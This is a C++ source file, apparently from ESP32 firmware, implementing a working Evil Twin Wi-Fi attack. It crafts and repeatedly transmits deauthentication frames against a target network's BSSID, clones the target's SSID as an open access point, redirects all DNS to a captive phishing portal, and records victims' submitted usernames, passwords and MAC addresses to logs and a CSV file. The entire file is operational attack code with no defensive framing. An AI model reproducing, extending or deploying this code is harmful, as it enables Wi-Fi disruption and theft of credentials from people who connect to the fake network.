#include "EvilTwin.h"
#include "App.h"
#include "SdCardManager.h"
#include "Logger.h"
#include <esp_wifi.h>

// --- INITIALIZE STATIC MEMBERS ---
EvilTwin* EvilTwin::instance_ = nullptr;

const uint8_t EvilTwin::deauth_frame_template[] = {
    0xc0, 0x00, 0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination: BROADCAST
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source: Set to target BSSID
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID: Set to target BSSID
    0xf0, 0xff, 0x02, 0x00 // Reason code: 2 (Previous auth no longer valid)
};

EvilTwin::EvilTwin() :
    app_(nullptr),
    isActive_(false),
    isAttackPending_(false),
    webServer_(80),
    lastDeauthTime_(0)
{
    // Set the static instance pointer so the callback can find our object
    instance_ = this;
}

// --- NEW STATIC EVENT HANDLER ---
void EvilTwin::onStationConnected(WiFiEvent_t event, WiFiEventInfo_t info) {
    if (instance_ && instance_->isActive()) {
        char macStr[18];
        sprintf(macStr, "%02X:%02X:%02X:%02X:%02X:%02X",
                info.wifi_ap_staconnected.mac[0], info.wifi_ap_staconnected.mac[1],
                info.wifi_ap_staconnected.mac[2], info.wifi_ap_staconnected.mac[3],
                info.wifi_ap_staconnected.mac[4], info.wifi_ap_staconnected.mac[5]);
        
        instance_->lastClientMac_ = macStr;
        // Serial.printf("[EVILTWIN] Client Connected. MAC: %s\n", macStr);
        LOG(LogLevel::INFO, "EVILTWIN", "Client Connected. MAC: %s", macStr);
    }
}

void EvilTwin::setup(App* app) {
    app_ = app;
}

void EvilTwin::prepareAttack() {
    if (isActive_) stop();
    isAttackPending_ = true;
    capturedCredentials_.clear();
    selectedPortal_ = "";
    lastClientMac_ = "";
    // Serial.println("[EVILTWIN] Attack prepared. State has been reset.");
    LOG(LogLevel::INFO, "EVILTWIN", "Attack prepared. State has been reset.");
}

void EvilTwin::setSelectedPortal(const std::string& portalName) {
    selectedPortal_ = portalName;
    // Serial.printf("[EVILTWIN] Portal selected: %s\n", selectedPortal_.c_str());
    LOG(LogLevel::INFO, "EVILTWIN", "Portal selected: %s", selectedPortal_.c_str());
}

bool EvilTwin::start(const WifiNetworkInfo& target) {
    if (isActive_ || !isAttackPending_ || selectedPortal_.empty()) {
        // Serial.printf("[EVILTWIN] Attack start failed. State: isActive=%d, isPending=%d, portalEmpty=%d\n", 
        //     isActive_, isAttackPending_, selectedPortal_.empty());
        LOG(LogLevel::ERROR, "EVILTWIN", "Attack start failed. State: isActive=%d, isPending=%d, portalEmpty=%d", 
            isActive_, isAttackPending_, selectedPortal_.empty());
        return false;
    }

    rfLock_ = app_->getHardwareManager().requestRfControl(RfClient::ROGUE_AP);
    if (!rfLock_ || !rfLock_->isValid()) {
        // Serial.println("[EVILTWIN] Failed to acquire RF Lock.");
        LOG(LogLevel::ERROR, "EVILTWIN", "Failed to acquire RF Lock.");
        return false;
    }
    
    // --- REGISTER EVENT HANDLER ON START ---
    WiFi.onEvent(onStationConnected, ARDUINO_EVENT_WIFI_AP_STACONNECTED);

    targetNetwork_ = target;
    isAttackPending_ = false;
    isActive_ = true;
    lastDeauthTime_ = 0;

    // Serial.printf("[EVILTWIN] Starting attack on SSID: %s (Channel: %d) using portal '%s'\n", 
    //               targetNetwork_.ssid, targetNetwork_.channel, selectedPortal_.c_str());
    LOG(LogLevel::INFO, "EVILTWIN", "Starting attack on SSID: %s (Channel: %d) using portal '%s'", 
                  targetNetwork_.ssid, targetNetwork_.channel, selectedPortal_.c_str());

    int cloneChannel = (targetNetwork_.channel == 1) ? 6 : 1;
    WiFi.softAP(targetNetwork_.ssid, nullptr, cloneChannel);
    startWebServer();
    app_->getHardwareManager().setPerformanceMode(true);
    return true;
}

void EvilTwin::stop() {
    if (!isActive_) return;
    // Serial.println("[EVILTWIN] Stopping Evil Twin attack.");
    LOG(LogLevel::INFO, "EVILTWIN", "Stopping Evil Twin attack.");
    
    // --- UNREGISTER EVENT HANDLER ON STOP ---
    WiFi.removeEvent(ARDUINO_EVENT_WIFI_AP_STACONNECTED);
    
    webServer_.end();
    dnsServer_.stop();
    WiFi.softAPdisconnect(true);
    rfLock_.reset(); 
    isActive_ = false;
    isAttackPending_ = false;
    app_->getHardwareManager().setPerformanceMode(false);
}

void EvilTwin::loop() {
    if (!isActive_) return;
    dnsServer_.processNextRequest();
    if (millis() - lastDeauthTime_ > 500) {
        deauthRoutine();
        lastDeauthTime_ = millis();
    }
}

void EvilTwin::deauthRoutine() {
    esp_wifi_set_channel(targetNetwork_.channel, WIFI_SECOND_CHAN_NONE);
    uint8_t deauth_packet[sizeof(deauth_frame_template)];
    memcpy(deauth_packet, deauth_frame_template, sizeof(deauth_frame_template));
    memcpy(&deauth_packet[10], targetNetwork_.bssid, 6);
    memcpy(&deauth_packet[16], targetNetwork_.bssid, 6);
    for (int i = 0; i < 5; i++) {
        esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
        delay(2);
    }
    int cloneChannel = (targetNetwork_.channel == 1) ? 6 : 1;
    esp_wifi_set_channel(cloneChannel, WIFI_SECOND_CHAN_NONE);
}

void EvilTwin::startWebServer() {
    dnsServer_.start(53, "*", WiFi.softAPIP());
    // Serial.printf("[EVILTWIN] DNS Server started. AP IP: %s\n", WiFi.softAPIP().toString().c_str());
    LOG(LogLevel::INFO, "EVILTWIN", "DNS Server started. AP IP: %s", WiFi.softAPIP().toString().c_str());

    webServer_.on("/login", HTTP_ANY, [this](AsyncWebServerRequest *request){ this->handleLogin(request); });
    webServer_.on("/", HTTP_GET, [this](AsyncWebServerRequest *request){ this->handleCaptivePortal(request); });
    webServer_.onNotFound([this](AsyncWebServerRequest *request){ this->handleCaptivePortal(request); });
    webServer_.begin();
    Serial.println("[EVILTWIN] Web Server started.");
}

void EvilTwin::handleLogin(AsyncWebServerRequest* request) {
    if (request->hasParam("username") && request->hasParam("password")) {
        
        VictimCredentials victim;
        victim.clientMac = lastClientMac_;
        victim.username = request->getParam("username")->value().c_str();
        victim.password = request->getParam("password")->value().c_str();
        
        capturedCredentials_.push_back(victim);

        // Serial.printf("[EVILTWIN] >>>>>>>>> CAPTURED CREDENTIALS (Victim #%d) <<<<<<<<<\n", capturedCredentials_.size());
        // Serial.printf("           Portal: %s\n", selectedPortal_.c_str());
        // Serial.printf("           SSID:   %s\n", targetNetwork_.ssid);
        // Serial.printf("           Client MAC: %s\n", victim.clientMac.c_str());
        // Serial.printf("           User:   %s\n", victim.username.c_str());
        // Serial.printf("           Pass:   %s\n", victim.password.c_str());

        LOG(LogLevel::INFO, "EVILTWIN", "CAPTURED CREDENTIALS (Victim #%d)", capturedCredentials_.size());
        LOG(LogLevel::INFO, "EVILTWIN", "Portal: %s", selectedPortal_.c_str());
        LOG(LogLevel::INFO, "EVILTWIN", "SSID: %s", targetNetwork_.ssid);
        LOG(LogLevel::INFO, "EVILTWIN", "Client MAC: %s", victim.clientMac.c_str());
        LOG(LogLevel::INFO, "EVILTWIN", "User: %s", victim.username.c_str());
        LOG(LogLevel::INFO, "EVILTWIN", "Pass: %s", victim.password.c_str());
        
        // --- SAVE TO CSV ---
        const char* log_path = SD_ROOT::CAPTURES_EVILTWIN_CSV;

        // Step 1: Check if the file exists. If not, create it with a header.
        if (!SdCardManager::exists(log_path)) {
            // Serial.println("[EVILTWIN] Log file not found. Creating with header.");
            LOG(LogLevel::INFO, "EVILTWIN", "Log file not found. Creating with header.");
            File logFile = SdCardManager::openFile(log_path, FILE_WRITE);
            if (logFile) {
                logFile.println("timestamp,portal_used,ssid_cloned,client_mac,username,password");
                logFile.close();
            } else {
                Serial.println("[EVILTWIN] FAILED to create log file!");
                LOG(LogLevel::ERROR, "EVILTWIN", "FAILED to create log file!");
            }
        }
        
        // Step 2: Open the file in APPEND mode to add the new credentials.
        File logFile = SdCardManager::openFile(log_path, FILE_APPEND);
        if (logFile) {
            logFile.printf("%lu,%s,%s,%s,%s,%s\n",
                           millis(),
                           selectedPortal_.c_str(),
                           targetNetwork_.ssid,
                           victim.clientMac.c_str(),
                           victim.username.c_str(),
                           victim.password.c_str());
            logFile.close();
            // Serial.println("[EVILTWIN] Credentials saved to SD card.");
            LOG(LogLevel::INFO, "EVILTWIN", "Credentials saved to SD card.");
        } else {
            // Serial.println("[EVILTWIN] FAILED to open log file for appending!");
            LOG(LogLevel::ERROR, "EVILTWIN", "FAILED to open log file for appending!");
        }

        String successPage = "<html><head><title>Success</title></head><body><h1>Connection Successful</h1><p>You may now close this page.</p></body></html>";
        request->send(200, "text/html", successPage);
    } else {
        request->send(400, "text/plain", "Bad Request: Missing parameters.");
    }
}

void EvilTwin::handleCaptivePortal(AsyncWebServerRequest* request) {
    if (selectedPortal_.empty()) {
        request->send(500, "text/plain", "Server Error: No portal selected.");
        return;
    }
    String portal_path = String(SD_ROOT::USER_PORTALS) + "/" + String(selectedPortal_.c_str()) + "/index.html";
    if (SdCardManager::exists(portal_path.c_str())) {
        request->send(SD, portal_path.c_str(), "text/html");
    } else {
        request->send(404, "text/plain", "Portal page not found on SD card.");
    }
}

// --- Getter Implementations ---
bool EvilTwin::isActive() const { return isActive_; }
bool EvilTwin::isAttackPending() const { return isAttackPending_; }
const WifiNetworkInfo& EvilTwin::getTargetNetwork() const { return targetNetwork_; }
int EvilTwin::getVictimCount() const { return capturedCredentials_.size(); }